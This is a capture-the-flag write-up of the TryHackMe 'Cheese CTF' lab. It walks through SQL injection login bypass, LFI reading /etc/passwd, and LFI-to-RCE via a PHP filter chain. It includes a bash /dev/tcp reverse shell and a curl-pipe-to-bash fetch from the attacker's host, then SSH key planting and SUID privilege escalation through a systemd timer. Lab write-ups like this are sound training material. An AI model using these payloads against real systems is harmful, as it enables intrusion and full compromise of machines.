---
categories: [makine]
layout: post
lang: en
description: "Cheese takes you to a delicious but dangerous web server. Your goal? Exploit vulnerabilities to get past the digital cheese traps on the system and collect all the flags."
logo: "/assets/images/cheese_ctf.png"
tags: [TryHackMe, SQLi]
order: 3
author: nazy
permalink: /en/Tryhackme_CheeseCTF
translation_url: /Tryhackme_CheeseCTF
---
## Port Scan

Machine IP address: 10.10.87.129

We start by running an nmap port scan to gather information about the machine.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/port.webp' | relative_url }}" width="300" height="600" alt="Terminal output of the nmap port scan">
</div>
We see that port 80 is open, so let's visit the page in the browser.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/web.webp' | relative_url }}" width="400" height="300" alt="Home page of the web server on port 80 as seen in the browser">
</div>
While browsing the page, we notice there's also a login page.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/login.webp' | relative_url }}" width="400" height="300" alt="The web application's user login page">
</div>

## SQLi

Let's try to log in via the login page using an SQLi attack. I wanted to do this with a wordlist through Burp Suite. Let's open Burp Suite. Let's capture the POST request from the login page.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sqli.webp' | relative_url }}" width="600" height="400" alt="POST request from the login page captured with Burp Suite">
</div>
After capturing the packet, let's choose the "Send to Intruder" option. This way we can test on the parameter we want. Since I'll be testing on the "username" parameter in Intruder, I select the username value and click the Add button. This is the area marked in yellow in the screenshot. It should make it easier to understand.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/intruder.webp' | relative_url }}" width="600" height="400" alt="Marking the username parameter in Burp Suite Intruder">
</div>
After selecting this, let's set the Payload Type option in the menu on the left. Since I'll be pulling the test values from a ready-made wordlist, I chose the Runtime File option.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/runti.webp' | relative_url }}" width="800" height="300" alt="Selecting Runtime File as the Payload Type in Intruder">
</div>
After clicking Start Attack, our attack begins. Depending on the size of the wordlist, the attack takes longer. After a while, we find a value that gives a successful login. Since the first successful result in my wordlist was "'||2—2", I'll use this value. I log in to the login page with "'||2—2" as the username and just pressing any key for the password.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/logsql.webp' | relative_url }}" width="400" height="300" alt="Successful login to the login page with the SQL injection payload">
</div>
After logging in, we're greeted by a panel.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/panel.webp' | relative_url }}" width="700" height="250" alt="Screenshot of the admin panel accessed after login">
</div>
The page's URL catches my attention. This URL shows that the page accepts php files and dynamically loads content using a file parameter.

## LFI

Let's try a simple LFI payload where the file parameter is. If we specify "../../../../../../etc/passwd" as the file path after the file parameter, we might be able to get the list of users.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/lfi.webp' | relative_url }}" width="900" height="150" alt="Displaying the /etc/passwd file with the LFI payload">
</div>
Bingo, the LFI works and we're able to pull the users. We have two important users. The first is the Root account, and the second is a user account named "comte".
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/shdw.webp' | relative_url }}" width="900" height="250" alt="Root and comte users visible in the /etc/passwd output">
</div>
## LFI to RCE

PHP can read and process files and data in different ways using mechanisms called stream wrappers. This library makes things easier for developers. But it can also be combined with an LFI vulnerability and abused.

On our machine, we'll try to achieve remote code execution using a method called filter chain. I carried out this method using [this](https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/) resource.

**Step 1**

I set up the [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git) repo on my Kali machine.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> git clone [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git)
</div>


**Step 2**

We create a shell named "revshell" on our Kali machine.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> echo 'bash -i >& /dev/tcp/10.9.0.127/4444 0>&1' > revshell
</div>

We'll achieve remote code execution by having the victim system connect to this shell we created. So after the / symbol, you enter your own IP address (or your VPN IP address if you connected via VPN) and the port you want to listen on. Let's start a python server in the same folder to make the shell accessible.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> sudo python3 -m http.server 80
</div>

**Step 3**

After creating the shell and making it accessible, let's create a filter chain using the tool we downloaded, targeting the victim system's URL.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '?= \`curl -s -L 10.9.0.127/revshell|bash\` ?'
</div>

Let's copy the long lines from its output. We'll use this output in Step 5.

**Step 4**

Let's start our listener.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> nc -lvnp 4444
</div>

**Step 5**

Now it's time to place the output we copied in Step 3 into the browser instead. Let's write our own output into the area marked in red.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/url.webp' | relative_url }}" width="1000" height="60" alt="Placing the PHP filter chain output into the browser URL">
</div>
**Step 6**

You can go back to the terminal where you're listening with Netcat to reach the shell.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/shell.webp' | relative_url }}" width="400" height="360" alt="Reverse shell connection obtained via the Netcat listener">
</div>

## Privilege Escalation

After gaining access to the system, we were able to access the "comte" user's home folder.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/comte.webp' | relative_url }}" width="400" height="100" alt="Listing the files in comte user's home directory">
</div>
However, when we tried to view the user.txt file here, we got a "Permission Denied" error. So we decided to look around a bit more. Let's check the hidden folders with the ls -al command.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/ls.webp' | relative_url }}" width="600" height="300" alt="Viewing the hidden .ssh folder with the ls -al command">
</div>
We can examine the .ssh folder here. Inside the .ssh folder we found the file with the allowed ssh keys.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/key.webp' | relative_url }}" width="500" height="80" alt="Permissions and contents of the authorized_keys file in the .ssh folder">
</div>
When we view this file's permissions, we learn that it's readable and writable by everyone. So our next step is to create our own ssh key and use it to gain access to the system as the comte user.
Let's create our own key using the ssh-keygen tool on our own Kali machine.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/ssh-keygen.webp' | relative_url }}" width="560" height="360" alt="Generating an SSH key pair with the ssh-keygen command">
</div>
After creating the key, let's go to where it was created and copy the public key.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/public.webp' | relative_url }}" width="800" height="200" alt="Viewing the generated public SSH key in the terminal">
</div>
We'll make the system trust us by adding the value we copied to the .ssh/authorized\_keys file on the victim's system. This way we'll be able to connect to the comte user via ssh.

Let's go back to the shell terminal and add the ssh key to the file.

·        echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINoaiZgti9CA7VtKc8G6LUaUIP9QJL/mO4GT/KSWI1Sg root@kali" > /home/comte/.ssh/authorized\_keys

After adding it, we can log in on our own Kali machine with the ssh comte@ip\_adress command.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/user.webp' | relative_url }}" width="400" height="500" alt="Connecting to the system as the comte user via SSH">
</div>
This way we obtain our first flag, user.txt.

## Comte to Root

To reach the root user from the comte user, let's first check this user's privileges.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sudo.webp' | relative_url }}" width="600" height="150" alt="Privileges shown by the sudo -l command for the comte user">
</div>
I looked at what we could do with the files we see here. The exploit.timer file can trigger and start a file named exploit.service. So what does the content of this file named exploit.service contain that could give us root privileges?

·        nano /etc/systemd/system/exploit.service
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/service.webp' | relative_url }}" width="700" height="130" alt="Content of the exploit.service file viewed with nano">
</div>
This code moves a copy of the xxd program to the /opt folder. Afterwards it gives it the +sx property, meaning whoever runs it now, it can behave like Root. We also have an exploit.timer file to trigger the running of this service file. We can also edit and run this file.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/unit.webp' | relative_url }}" width="330" height="260" alt="Content of the exploit.timer file edited with the OnBootSec setting">
</div>
We set the run time with OnBootSec. After setting it, we used this command to make the system read the new file:

·        sudo systemctl daemon-reload

To start the exploit.timer timer, we used this command:

·        sudo systemctl start exploit.timer

This way, 4 seconds after the timer starts, the exploit.service file will run. To verify that the file has run, we can view the file's permissions with the ls -l /opt/xxd command.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/opt.webp' | relative_url }}" width="600" height="60" alt="Output of the ls -l /opt/xxd command showing the SUID bit">
</div>
The -s here, i.e. SUID, means that when a user runs it, that file runs not with the permissions of the user who ran it, but with the permissions of the file's owner. So we'll run the file as comte, but it will run with root user's privileges.

We can view the root.txt file owned by the root user with this command:

·        /opt/xxd /root/root.txt | xxd -r

The /opt/xxd tool prints the /root/root.txt file we give it to the screen in hex form. But since this format isn't readable for us, we convert it into normal text with the | xxd -r command as well. You can read more about this command at [this](https://gtfobins.github.io/gtfobins/xxd/) address.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/root.webp' | relative_url }}" width="600" height="220" alt="Content of the root.txt flag obtained with the /opt/xxd tool">
</div>
## Notes

Ssh-keygen

A tool used on Linux systems to generate an encrypted key pair.

·        **Private key**: Secret, never shared with anyone.

·        **Public key**: Given to the remote server

### Xxd

A command that displays a binary file or text in hex format. You can convert hex back to normal text with the -r parameter.

### SUID

Normally when a program runs, it has the privileges of the current user, but if the program has the SUID bit, it runs with the owner's privileges when executed.

·        ls -l /usr/bin/passwd

Commands like this can be used to check the program's permissions.
